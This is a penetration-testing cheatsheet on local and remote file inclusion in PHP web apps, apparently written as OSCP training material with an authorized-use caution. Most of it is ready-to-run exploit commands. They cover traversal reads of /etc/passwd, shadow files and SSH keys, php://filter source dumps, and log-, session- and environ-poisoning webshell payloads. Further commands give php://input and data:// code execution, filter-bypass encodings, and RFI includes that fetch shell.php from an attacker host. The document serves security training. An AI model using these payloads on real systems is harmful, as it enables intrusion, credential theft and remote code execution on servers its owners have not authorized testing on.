# LFI / RFI (Local and Remote File Inclusion)

> File inclusion vulnerabilities: the target includes a file from a path
> or URL that the attacker controls. Often leads to source disclosure, then RCE.

> [!CAUTION]
> Authorized use only. See [../../SECURITY.md](../../../SECURITY.md).

---

## Table of Contents

- [1. Overview](#1-overview)
- [2. Scope & OPSEC](#2-scope--opsec)
- [3. Detection](#3-detection)
- [4. LFI Exploitation](#4-lfi-exploitation)
- [5. RFI Exploitation](#5-rfi-exploitation)
- [6. Wrappers Reference](#6-wrappers-reference)
- [7. Filter Bypass](#7-filter-bypass)
- [8. Tools](#8-tools)
- [9. OSCP Notes](#9-oscp-notes)
- [10. Cheatsheet](#10-cheatsheet)
- [11. References](#11-references)

---

## 1. Overview

Three related bugs, often confused:

| Bug | What it does | Example |
|-----|--------------|---------|
| Path Traversal | Read files by breaking out of a directory | ?file=../../../etc/passwd |
| LFI | Include a LOCAL file the server can access | ?page=/etc/passwd |
| RFI | Include a REMOTE file the attacker hosts | ?page=http://attacker/shell.txt |

**Impact chain:**

1. Read source code (config files, credentials).
2. Read /etc/passwd, /root/.ssh/id_rsa (if permissions allow).
3. Poison a log file and include it for RCE (log poisoning).
4. Use PHP wrappers for direct RCE (php://input, data://, expect://).
5. RFI: include a shell from your server.

**On OSCP:** LFI is very common. Always look for a chain from LFI to RCE
(log poisoning, wrappers, session files). LFI alone is a finding, LFI to RCE
is a foothold.

---

## 2. Scope & OPSEC

### 2.1 Risk

| Action | Tag |
|--------|-----|
| Manual path traversal probe | [PROD] |
| Reading /etc/passwd, source files | [PROD-RISK] |
| Log poisoning (injects into shared logs) | [PROD-NO] |
| Wrapper-based RCE (php://input, data://) | [PROD-NO] |
| RFI to attacker server | [PROD-NO] |

### 2.2 What NOT to do (production)

- Do NOT read /etc/shadow, cloud credentials, or user private keys.
- Do NOT poison system-wide logs (impacts other users).
- Do NOT use wrapper-based RCE without written approval.
- Do NOT use RFI (calls out to attacker infrastructure, may violate scope).
- Do NOT include /proc/self/environ at scale (often crashes workers).

### 2.3 Rate limiting

LFI requests are individual HTTP calls. In production, do not brute-force
traversal depths or wrapper chains; the app may log or lock.

---

## 3. Detection

### 3.1 Basic probes

Look for parameters that accept file paths or page names:

- ?file=, ?page=, ?path=, ?include=, ?template=, ?view=, ?doc=
- ?lang=, ?locale=, ?module=, ?action=
- ?img=, ?image=, ?download=, ?attachment=

Then probe:

```bash
# Linux
curl 'http://target/?file=../../../../etc/passwd'
curl 'http://target/?file=/etc/passwd'
curl 'http://target/?file=....//....//....//etc/passwd'

# Windows
curl 'http://target/?file=..\\..\\..\\..\\windows\\win.ini'
curl 'http://target/?file=C:\\Windows\\win.ini'
```

**Expected output (Linux success):**

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

### 3.2 Common params to try

```bash
for p in file page path include template view doc lang locale module img image download attachment; do
    echo --- $p ---
    curl -s 'http://target/?$p=/etc/passwd' | head -3
done
```

### 3.3 Wrapper detection

If the app is PHP, test wrappers directly:

```bash
curl 'http://target/?file=php://filter/convert.base64-encode/resource=index.php'
curl 'http://target/?file=data://text/plain,test'
curl 'http://target/?file=expect://id'
```

A base64 blob in the response means the wrapper is not filtered.

---

## 4. LFI Exploitation

### 4.1 Basic traversal

Linux targets:

```text
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/proc/self/cwd/
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log
/var/log/mail.log
/var/log/vsftpd.log
/root/.ssh/id_rsa
/root/.bash_history
/home/[user]/.ssh/id_rsa
/home/[user]/.bash_history
```

Windows targets:

```text
C:\\Windows\\win.ini
C:\\Windows\\System32\\drivers\\etc\\hosts
C:\\Windows\\System32\\config\\SAM
C:\\Windows\\repair\\SAM
C:\\Windows\\Panther\\Unattend.xml
C:\\inetpub\\logs\\LogFiles\\
```

Traversal depth: usually 5-10 levels is enough. Try multiple encodings
(see section 7).

### 4.2 Reading source via php://filter

When you cannot read PHP source raw (it executes), use php://filter:

```bash
curl 'http://target/?file=php://filter/convert.base64-encode/resource=index.php'
```

Then decode:

```bash
curl -s 'http://target/?file=php://filter/convert.base64-encode/resource=index.php' | base64 -d
```

This dumps the raw PHP source, revealing:

- Database credentials
- API keys
- Include paths (for further LFI)
- Filter logic (to bypass)

### 4.3 Log poisoning

Inject PHP code into a log file, then include the log via LFI.

**Apache access.log:**

```bash
curl -A '<?php system($_GET['c']); ?>' 'http://target/'
curl 'http://target/?file=/var/log/apache2/access.log&c=id'
```

**Apache error.log** (payload in URL, triggers 404):

```bash
curl 'http://target/<?php system($_GET['c']); ?>'
curl 'http://target/?file=/var/log/apache2/error.log&c=id'
```

**SSH auth.log** (if OpenSSH accepts weird usernames):

```bash
ssh '<?php system($_GET['c']); ?>'@target
curl 'http://target/?file=/var/log/auth.log&c=id'
```

**Mail log** (send an email with payload in From/Subject):

```bash
sendmail attacker@target </dev/null
Subject: <?php system($_GET['c']); ?>
```

**Log paths to know:**

| Log | Default path |
|-----|--------------|
| Apache access | /var/log/apache2/access.log |
| Apache error | /var/log/apache2/error.log |
| Nginx access | /var/log/nginx/access.log |
| Nginx error | /var/log/nginx/error.log |
| SSH auth | /var/log/auth.log (Debian) or /var/log/secure (RHEL) |
| Mail | /var/log/mail.log |
| FTP (vsftpd) | /var/log/vsftpd.log |
| IIS | C:\\inetpub\\logs\\LogFiles\\ |

### 4.4 /proc/self/environ

If the target has a writable User-Agent (or Referer) reflected in environ,
include it:

```bash
curl -A '<?php system($_GET['c']); ?>' 'http://target/?file=/proc/self/environ&c=id'
```

Often blocked by modern kernels (proc hidepid, permissions). Fallback:
log poisoning.

### 4.5 Session files

If the app stores session data in a file with attacker-controlled content:

1. Find session file path (usually /var/lib/php/sessions/sess_[PHPSESSID]).
2. Write payload into session (e.g. via a form field).
3. Include the session file via LFI.

```bash
curl 'http://target/login' -b 'PHPSESSID=abc123' -d 'username=<?php system($_GET['c']); ?>&password=x'
curl 'http://target/?file=/var/lib/php/sessions/sess_abc123&c=id'
```

### 4.6 LFI to RCE chains

**Chain 1: LFI + log poisoning -> webshell**

```bash
curl -A '<?php system($_GET['c']); ?>' 'http://target/'
curl 'http://target/?file=/var/log/apache2/access.log&c=id'
```

**Chain 2: LFI + php://input -> RCE** (requires allow_url_include=On):

```bash
curl 'http://target/?file=php://input' --data '<?php system($_GET['c']); ?>'
curl 'http://target/?file=php://input&c=id' --data '<?php system($_GET['c']); ?>'
```

**Chain 3: LFI + data:// -> RCE** (requires allow_url_include=On):

```bash
curl 'http://target/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=='
```

(base64 of <?php system($_GET['c']); ?>)

**Chain 4: LFI + /proc/self/environ -> RCE:**

```bash
curl -A '<?php system($_GET['c']); ?>' 'http://target/?file=/proc/self/environ&c=id'
```

### 4.7 PHP filter chain RCE

Advanced technique: chain convert.iconv filters to synthesize PHP code
from php://temp without needing allow_url_include.

Requires the LFI to allow php://filter with any resource. Tool:

```bash
git clone https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET['c']); ?>'
# copy the generated php://filter/... URL into ?file=
```

Reference: Synacktiv, 'PHP filter chains: file read from error-based oracle'.

---

## 5. RFI Exploitation

RFI requires allow_url_include=On in PHP (rare in modern deployments).

### 5.1 Basic HTTP include

Host a PHP file on your server:

```bash
# shell.php (on attacker)
<?php system($_GET['c']); ?>

# Start HTTP server
python3 -m http.server 80
```

Include it via the target:

```bash
curl 'http://target/?file=http://attacker.tld/shell.php&c=id'
```

### 5.2 SMB / WebDAV

For Windows targets, PHP can include via SMB:

```bash
curl 'http://target/?file=\\\\attacker.tld\\share\\shell.php&c=id'
```

Set up an SMB share with impacket-smbserver:

```bash
impacket-smbserver share . -smb2support
```

### 5.3 FTP

```bash
curl 'http://target/?file=ftp://attacker.tld/shell.php&c=id'
```

### 5.4 Restricted include bypass

If HTTP is blocked but the app allows arbitrary wrappers, try:

- data:// wrapper (inline payload, no remote fetch).
- SMB via 127.0.0.1 share with crafted payload.
- \\\\127.0.0.1\\ path for local files over SMB.

---

## 6. Wrappers Reference

| Wrapper | Purpose | Requires | Example |
|---------|---------|----------|---------|
| php://filter | Read with filters (base64, iconv) | nothing special | php://filter/convert.base64-encode/resource=index.php |
| php://input | Read POST body as file | allow_url_include=On | ?file=php://input (POST body is PHP code) |
| data:// | Inline data as file | allow_url_include=On | ?file=data://text/plain;base64,... |
| expect:// | Execute commands | expect extension | ?file=expect://id |
| zip:// | Read file inside ZIP | ability to upload ZIP | ?file=zip:///path/upload.zip%23shell.php |
| phar:// | Read PHAR archive (unserialize) | ability to upload PHAR | ?file=phar:///path/upload.phar/x |
| glob:// | List files by pattern | nothing special | ?file=glob:///var/www/* |

**Top 3 for OSCP:** php://filter, php://input, data://.

### 6.1 Reading source via php://filter

```bash
curl 'http://target/?file=php://filter/convert.base64-encode/resource=index.php' | base64 -d
```

### 6.2 php://input RCE

```bash
curl 'http://target/?file=php://input' --data '<?php system($_GET['c']); ?>'
```

### 6.3 data:// RCE

```bash
curl 'http://target/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=='
```

---

## 7. Filter Bypass

Common filters and bypasses:

| Filter | Bypass |
|--------|--------|
| Strip ../ | ....// or ..././ or ..%2f |
| Strip / | ..%2f or ..%252f |
| Strip null byte | Use null byte in old PHP (%00) - blocked since 5.3.4 |
| Allowlist extensions | Append null byte (old) or use path tricks |
| Strip php | Use case (PHP), encode (%70hp) |
| Encode once | Try double encoding: %252e%252e%252f |
| Strip wrapper | Try uppercase (PHP://), whitespace, comments |

**Encoding examples:**

```text
Plain:        ../../../etc/passwd
URL:          ..%2f..%2f..%2fetc%2fpasswd
Double URL:   ..%252f..%252f..%252fetc%252fpasswd
Unicode:      ..%c0%af..%c0%afetc/passwd
Overlong:     ..%c0%ae%c0%ae/
Mixed:        ....//....//etc/passwd
```

---

## 8. Tools

| Tool | Purpose |
|------|---------|
| LFISuite | Automated LFI exploitation |
| Kadimus | LFI scanner and exploiter |
| ffuf | Fuzz file parameters |
| Burp Intruder | Manual parameter fuzzing |
| php_filter_chain_generator | Generate PHP filter chain payloads |

Examples:

```bash
# Kadimus
kadimus -u 'http://target/?file=index.php'

# LFISuite
python3 lfisuite.py

# ffuf on file parameter
ffuf -u 'http://target/?file=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
```

---

## 9. OSCP Notes

> [!IMPORTANT]
> OSCP report:
> - Screenshot the LFI proof (/etc/passwd contents).
> - Screenshot the source disclosure (php://filter -> decoded config).
> - Screenshot the log poisoning write and the RCE read (id output).
> - Screenshot the final webshell / reverse shell.
>
> LFI -> RCE chain is a common foothold. Always attempt: (1) log poisoning,
> (2) php://input or data:// if allow_url_include=On, (3) session file poisoning.
>
> See [../../methodology/OSCP-Reporting.md](../../../methodology/OSCP-Reporting.md).

---

## 10. Cheatsheet

```bash
# Basic LFI
curl 'http://target/?file=../../../../etc/passwd'
curl 'http://target/?file=/etc/passwd'

# Source disclosure
curl 'http://target/?file=php://filter/convert.base64-encode/resource=index.php' | base64 -d

# Log poisoning -> RCE
curl -A '<?php system($_GET['c']); ?>' 'http://target/'
curl 'http://target/?file=/var/log/apache2/access.log&c=id'

# php://input RCE (allow_url_include=On)
curl 'http://target/?file=php://input' --data '<?php system($_GET['c']); ?>'

# /proc/self/environ RCE
curl -A '<?php system($_GET['c']); ?>' 'http://target/?file=/proc/self/environ&c=id'

# RFI
curl 'http://target/?file=http://attacker.tld/shell.php&c=id'
```

---

## 11. References

- OWASP LFI - https://owasp.org/www-community/attacks/Path_Traversal
- PayloadsAllTheThings LFI - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
- php_filter_chain_generator - https://github.com/synacktiv/php_filter_chain_generator
- LFISuite - https://github.com/D35m0nd142/LFISuite
- Kadimus - https://github.com/P0cL4bs/Kadimus

> See also: [../01 Recon/WAF-Detection.md](../01%20Recon/WAF-Detection.md), [../06 Technologies/XXE.md](../08%20Vulnerabilities/XXE.md), [File-Upload.md](./File-Upload.md)

---

*Part of Bugterium. English only by design. Last updated: 2026-10-11.*
